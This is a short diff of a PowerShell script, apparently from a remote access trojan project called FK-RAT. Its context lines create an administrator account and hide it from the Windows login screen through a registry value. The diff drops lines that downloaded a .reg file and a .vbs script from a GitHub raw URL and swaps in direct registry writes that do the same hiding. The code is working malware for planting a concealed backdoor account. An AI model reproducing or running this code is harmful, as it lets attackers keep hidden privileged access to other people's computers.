@@ -41,13 +41,6 @@ Set-Location $dirName
 createAdmin -uName $uName -pWord $pWord
 
 ## Hide Admin with registry
-# registry to hide admin
-Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/admin.reg -OutFile "$regName.reg"
-
-# vbs to register the registry
-Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/confirm.vbs -OutFile "$vbsName.vbs"
-
-# install the registry
 New-Item -Path $regPath -Force
 New-ItemProperty -Path $regPath -Name $uName -Value 00000000
 
